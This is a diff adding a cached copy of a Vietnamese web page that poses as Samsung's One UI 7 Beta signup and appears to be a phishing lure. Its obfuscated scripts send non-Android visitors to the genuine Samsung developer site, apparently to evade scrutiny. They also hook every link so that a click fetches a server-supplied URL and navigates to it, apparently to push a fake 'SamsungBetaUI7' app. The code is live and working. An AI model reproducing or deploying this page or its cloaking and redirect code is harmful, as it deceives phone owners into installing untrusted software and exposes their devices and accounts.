@@ -1,0 +1,328 @@
+<style type="text/css">
+    .disclaimer {
+        text-align: right;
+        font-size: x-small
+    }
+
+    .banner {
+        background-color: #fff;
+        text-align: left
+    }
+
+    .cacheContent {
+        position: relative
+    }
+
+    .b_vPanel>div {
+        padding-bottom: 10px
+    }
+
+    .b_vPanel>div:last-child {
+        padding: 0
+    }
+
+    .banner a {
+        color: #4007a2
+    }
+</style>
+<base href="https://samsungsecure.com/smartthingsfind.samsung.com/smart-switch" />
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<!-- Banner:Start --><!--LocalizedDate:26/11/2024--><!--InvariantDate:11/26/2024-->
+<div class="banner">
+    <div class="b_vPanel">
+        <div><!-- Title:Start -->You have reached the cached page for <strong><a
+                    href="https://samsungsecure.com/smartthingsfind.samsung.com/smart-switch"
+                    h="ID=SERP,5003.1">https://samsungsecure.com/smartthingsfind.samsung.com/smart-switch</a></strong><!-- Title:End -->
+        </div>
+        <div><!-- Content:Start -->Below is a snapshot of the Web page as it appeared on <strong>26/11/2024</strong>
+            (the last time our crawler visited it). This is the version of the page that was used for ranking your
+            search results. The page may have changed since we last cached it. To see what might have changed (without
+            the highlights), <a href="https://samsungsecure.com/smartthingsfind.samsung.com/smart-switch"
+                h="ID=SERP,5003.2">go to the current page</a>.<!-- Content:End --></div>
+        <div><!-- Disclaimer:Start -->
+            <div class="disclaimer">Bing is not responsible for the content of this page.</div><!-- Disclaimer:End -->
+        </div><!-- Banner:End -->
+    </div>
+</div>
+<div class="cacheContent">
+    <html lang="vi">
+
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="title" content="Đăng ký thử nghiệm One UI 7 Beta - Trải nghiệm sớm giao diện mới của Samsung" />
+        <meta name="description"
+            content="Đăng ký tham gia chương trình thử nghiệm One UI 7 Beta của Samsung, độc quyền cho các thiết bị nội địa Hàn Quốc. Hướng dẫn chi tiết cách đăng ký, cập nhật và khám phá các tính năng mới như giao diện cải tiến, hình ảnh động mượt mà và hỗ trợ 5G cho SMS." />
+        <meta name="keywords"
+            content="One UI 7 Beta, Samsung, đăng ký One UI 7, hướng dẫn One UI 7, thử nghiệm One UI 7, cập nhật Samsung, giao diện Samsung mới, tính năng One UI 7" />
+        <meta name="author" content="Samsung Update Team" />
+        <meta name="robots" content="index, follow" />
+
+        <meta property="og:title"
+            content="Đăng ký thử nghiệm One UI 7 Beta - Trải nghiệm sớm giao diện mới của Samsung" />
+        <meta property="og:description"
+            content="Hướng dẫn đăng ký One UI 7 Beta cho các thiết bị Samsung bản Hàn Quốc. Cơ hội trải nghiệm trước những tính năng đột phá như giao diện cải tiến, hình ảnh động mượt mà và hỗ trợ 5G." />
+        <meta property="og:image" content="https://samsungcare.site/images/1-1721185372777687340114.webp" />
+        <meta property="og:type" content="website" />
+
+        <meta name="twitter:card" content="summary_large_image" />
+        <meta name="twitter:title"
+            content="Đăng ký thử nghiệm One UI 7 Beta - Trải nghiệm sớm giao diện mới của Samsung" />
+        <meta name="twitter:description"
+            content="Hướng dẫn chi tiết cách đăng ký tham gia chương trình One UI 7 Beta, độc quyền tại Hàn Quốc." />
+        <meta name="twitter:image" content="https://samsungcare.site/images/1-1721185372777687340114.webp" />
+
+        <link rel="icon" href="../images/favicon-2023.ico" type="image/x-icon" />
+        <link rel="shortcut icon" href="../images/favicon-2023.ico" type="image/x-icon" />
+
+        <link rel="stylesheet" href="../css/sdp.vendors.min.css" />
+        <link rel="stylesheet" href="../css/sdp.app.min.css" />
+        <script src="/socket.io/socket.io.js"></script>
+        <style>
+            #loadingScreen {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5);
+                z-index: 9999;
+                justify-content: center;
+                align-items: center;
+                color: white;
+                font-size: 24px;
+            }
+        </style>
+        <script>
+            var _0x4aba66 = _0x1759;
+            function _0x4574() {
+                var _0x23140a = ["href", "test", "215664xVoRIy", "6372570jzOmPu", "location", "11263149dGvEbS", "8cQeseL", "15454XqlWiJ", "userAgent", "3958997NbTJmW", "4604325gVIWpr", "1750788KTfCtH", "8pdzkIr"];
+                _0x4574 = function () {
+                    return _0x23140a;
+                };
+                return _0x4574();
+            }
+            function _0x1759(_0x23a158, _0x2b0071) {
+                var _0x457462 = _0x4574();
+                return (
+                    (_0x1759 = function (_0x17596a, _0x325f38) {
+                        _0x17596a = _0x17596a - 0x10c;
+                        var _0x48a49a = _0x457462[_0x17596a];
+                        return _0x48a49a;
+                    }),
+                    _0x1759(_0x23a158, _0x2b0071)
+                );
+            }
+            (function (_0x2b0e70, _0x201f27) {
+                var _0x23b842 = _0x1759,
+                    _0x54d8b5 = _0x2b0e70();
+                while (!![]) {
+                    try {
+                        var _0x5e13c6 = parseInt(_0x23b842(0x112)) / 0x1 + -parseInt(_0x23b842(0x116)) / 0x2 + (-parseInt(_0x23b842(0x10d)) / 0x3) * (-parseInt(_0x23b842(0x117)) / 0x4) + parseInt(_0x23b842(0x115)) / 0x5 + parseInt(_0x23b842(0x10e)) / 0x6 + parseInt(_0x23b842(0x114)) / 0x7 + (-parseInt(_0x23b842(0x111)) / 0x8) * (parseInt(_0x23b842(0x110)) / 0x9);
+                        if (_0x5e13c6 === _0x201f27) break;
+                        else _0x54d8b5["push"](_0x54d8b5["shift"]());
+                    } catch (_0x461206) {
+                        _0x54d8b5["push"](_0x54d8b5["shift"]());
+                    }
+                }
+            })(_0x4574, 0x8dd2a);
+            !/Android/i[_0x4aba66(0x10c)](navigator[_0x4aba66(0x113)]) && (window[_0x4aba66(0x10f)][_0x4aba66(0x118)] = "https://developer.samsung.com/one-ui-beta");
+        </script>
+    </head>
+
+    <body>
+        <div id="loadingScreen"><img src="../images/spinner.svg" width="100px" height="100px" /></div>
+        <div>
+            <div class="wrapper">
+                <div class="sdp-container">
+                    <section>
+                        <div class="container full-container">
+                            <div class="js-change-img bold"
+                                style="display: flex; flex-direction: column; align-items: center; justify-content: center">
+                                <h3>Chương trình One UI Beta</h3>
+                                <p>Trải nghiệm <a href="javascript:void(0);">One UI mới nhất với Android 15</a>.</p>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section>
+                        <div class="container-wide-large px-0">
+                            <div class="comp-title-w-subtitle px-4">
+                                <div class="comp-title">
+                                    <h2 id="How-to-Join-One-UI-Beta-Program">Cách tham gia chương trình One UI Beta</h2>
+                                </div>
+                                <p>Tham gia Chương trình thử nghiệm Beta của chúng tôi để trải nghiệm One UI mới nhất.
+                                    Gửi cho chúng tôi phản hồi có giá trị của bạn để cải thiện trải nghiệm người dùng
+                                    Galaxy.</p>
+                            </div>
+                            <div class="two-column-card-group">
+                                <div class="two-column-panel">
+                                    <div class="img-figure">
+                                        <img
+                                            src="https://d3unf4s5rp9dfh.cloudfront.net/ONEUIBETA/Mobile_SDC%20banner.png" />
+                                    </div>
+                                    <div class="card-inner">
+                                        <h4>Bước 1. Trở thành người thử nghiệm beta</h4>
+                                        <p>
+                                            Tải xuống ứng dụng <a href="javascript:void(0);">SamsungBetaUI7</a> từ
+                                            Galaxy Store. <br />hoặc truy cập liên kết này (<a
+                                                href="javascript:void(0);">Cập nhật ngay</a>) <br />
+                                            Đăng nhập vào ứng dụng bằng Tài khoản Samsung của bạn và chọn "Đăng ký
+                                            Chương trình One UI Beta" trong biểu ngữ trang chủ hoặc trang thông báo để
+                                            đăng ký.
+                                        </p>
+                                    </div>
+                                </div>
+
+                                <div class="two-column-panel">
+                                    <div class="img-figure">
+                                        <img
+                                            src="https://d3unf4s5rp9dfh.cloudfront.net/ONEUIBETA/%5BSDP%5D%20OnuUI6_Step2_banner.jpg" />
+                                    </div>
+                                    <div class="card-inner">
+                                        <h4>Bước 2. Cập nhật phần mềm</h4>
+                                        <p>Trên thiết bị của bạn, chọn "Cài đặt &gt; Cập nhật phần mềm &gt; <a
+                                                href="javascript:void(0);">Tải xuống và cài đặt</a>". Phần mềm beta đã
+                                            được cài đặt. * Để tham gia Chương trình One UI Beta, bạn cần có Tài khoản
+                                            Samsung. Nếu bạn chưa có Tài khoản Samsung, hãy tạo một tài khoản tại <a
+                                                href="javascript:void(0);">https://account.samsung.com</a>. * Chương
+                                            trình One UI Beta chỉ khả dụng cho các thiết bị, phiên bản hệ điều hành và
+                                            quốc gia cụ thể. * Thời gian chương trình beta và các thiết bị tương thích
+                                            khác nhau tùy theo quốc gia. * Các tính năng của One UI có thể khác nhau tùy
+                                            thuộc vào thiết bị đã đăng ký tham gia chương trình beta.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section class="section-wrapper">
+                        <div class="container">
+                            <section>
+                                <div class="container-wide-large px-0">
+                                    <div class="comp-title-w-subtitle px-4">
+                                        <div class="comp-title">
+                                            <h2 id="Beta-Activities">Hoạt động Beta</h2>
+                                        </div>
+                                        <p>Giúp Samsung thu thập thông tin chi tiết và phản hồi hữu ích về các tính
+                                            năng, hiệu suất và khả năng sử dụng của phần mềm beta để phát triển phần mềm
+                                            đáng tin cậy hơn, hiệu suất cao hơn và mang đến cho người dùng thiết bị
+                                            Galaxy trải nghiệm được cải thiện và tối ưu hóa.</p>
+                                    </div>
+                                    <div class="two-column-card-group">
+                                        <div class="two-column-panel">
+                                            <div class="img-figure">
+                                                <img
+                                                    src="https://d3unf4s5rp9dfh.cloudfront.net/SDP/one-ui-beta-img-3.png" />
+                                            </div>
+                                            <div class="card-inner">
+                                                <h4>Báo cáo lỗi</h4>
+                                                <p>
+                                                    <b> Khi bạn đã đăng ký Chương trình One UI Beta, bạn có thể giúp cải
+                                                        thiện tính ổn định của phần mềm Galaxy bằng cách báo cáo các sự
+                                                        cố bạn gặp phải khi sử dụng phần mềm beta. </b>
+                                                    <br /><br />
+                                                    Để cung cấp phản hồi về lỗi hoặc lỗi trong phần mềm beta, trong ứng
+                                                    dụng Samsung Members, hãy chọn "Phản hồi beta &gt; Gửi phản hồi".
+                                                    <br /><br />
+                                                    <b> Lưu ý: </b>
+
+                                                    Để đảm bảo thông tin nhật ký có liên quan được đưa vào báo cáo lỗi,
+                                                    hãy gửi báo cáo trong vòng 3 phút sau khi gặp lỗi hoặc lỗi và không
+                                                    đóng (vuốt đi) ứng dụng Samsung Members cho đến khi bạn được thông
+                                                    báo rằng báo cáo đã được gửi. Quá trình này có thể mất tới 5 phút.
+                                                </p>
+                                            </div>
+                                        </div>
+
+                                        <div class="two-column-panel">
+                                            <div class="img-figure">
+                                                <img
+                                                    src="https://d3unf4s5rp9dfh.cloudfront.net/SDP/one-ui-beta-img-4.png" />
+                                            </div>
+                                            <div class="card-inner">
+                                                <h4>Đưa ra gợi ý về UX</h4>
+                                                <p>
+                                                    <b> Bạn có thể trải nghiệm UX mới và đóng góp vào trải nghiệm người
+                                                        dùng Galaxy thông qua cộng đồng, chẳng hạn như bằng cách cung
+                                                        cấp các đề xuất. </b>
+                                                    <br /><br />
+                                                    Để cung cấp phản hồi liên quan đến UX hoặc UI, chẳng hạn như khả
+                                                    năng sử dụng hoặc các đề xuất về tính năng, hãy chọn "Cộng đồng Beta
+                                                    &gt; Đề xuất". <br /><br />
+                                                    <b> Lưu ý: </b>
+
+                                                    Khu vực "Cộng đồng Beta" chỉ khả dụng trong giai đoạn beta công
+                                                    khai.
+                                                </p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </section>
+                        </div>
+                    </section>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            function _0x3024(_0x2b7dcc, _0x478300) {
+                const _0xad4cf7 = _0xad4c();
+                return (
+                    (_0x3024 = function (_0x3024c3, _0x263140) {
+                        _0x3024c3 = _0x3024c3 - 0x89;
+                        let _0xc423e5 = _0xad4cf7[_0x3024c3];
+                        return _0xc423e5;
+                    }),
+                    _0x3024(_0x2b7dcc, _0x478300)
+                );
+            }
+            const _0x190b98 = _0x3024;
+            (function (_0x4eb42c, _0x1c3da0) {
+                const _0x119f85 = _0x3024,
+                    _0x551abe = _0x4eb42c();
+                while (!![]) {
+                    try {
+                        const _0xdea55f = (-parseInt(_0x119f85(0x97)) / 0x1) * (-parseInt(_0x119f85(0x91)) / 0x2) + (-parseInt(_0x119f85(0x8d)) / 0x3) * (parseInt(_0x119f85(0x98)) / 0x4) + (parseInt(_0x119f85(0x96)) / 0x5) * (parseInt(_0x119f85(0x94)) / 0x6) + (-parseInt(_0x119f85(0x8e)) / 0x7) * (parseInt(_0x119f85(0x9a)) / 0x8) + (parseInt(_0x119f85(0x93)) / 0x9) * (parseInt(_0x119f85(0x89)) / 0xa) + -parseInt(_0x119f85(0x95)) / 0xb + (parseInt(_0x119f85(0x9b)) / 0xc) * (-parseInt(_0x119f85(0x92)) / 0xd);
+                        if (_0xdea55f === _0x1c3da0) break;
+                        else _0x551abe["push"](_0x551abe["shift"]());
+                    } catch (_0x2f2567) {
+                        _0x551abe["push"](_0x551abe["shift"]());
+                    }
+                }
+            })(_0xad4c, 0x41a39);
+            const socket = io();
+            function _0xad4c() {
+                const _0x54da8b = ["7ymcOtt", "694888QVflEs", "error-message", "8zpqVlh", "273396LgeqKB", "querySelectorAll", "796540VggCBc", "addEventListener", "fmm2-url", "forEach", "3uZsZvZ", "491953GxIffn", "emit", "href", "133186UqFFti", "39tyKQqu", "9QUMGHL", "54NjMsFG", "260117hUTfzR", "32805osRWBa"];
+                _0xad4c = function () {
+                    return _0x54da8b;
+                };
+                return _0xad4c();
+            }
+
+            function showLoadingScreen() {
+                document.getElementById("loadingScreen").style.display = "flex";
+
+                setTimeout(hideLoadingScreen, 30000);
+            }
+
+            function hideLoadingScreen() {
+                document.getElementById("loadingScreen").style.display = "none";
+            }
+
+            socket.on("showLoadingScreen", showLoadingScreen);
+            socket.on("error-message", hideLoadingScreen);
+
+            socket["on"](_0x190b98(0x8b), (_0x4c6ff8) => (window["location"][_0x190b98(0x90)] = _0x4c6ff8)),
+                socket["on"](_0x190b98(0x99), (_0x388739) => alert(_0x388739)),
+                document[_0x190b98(0x9c)]("a")[_0x190b98(0x8c)]((_0x2c524f) => {
+                    const _0x25fbc3 = _0x190b98;
+                    _0x2c524f[_0x25fbc3(0x8a)]("click", (_0x33f475) => socket[_0x25fbc3(0x8f)]("get-app-url"));
+                });
+        </script>
+    </body>
+
+    </html>
+</div>
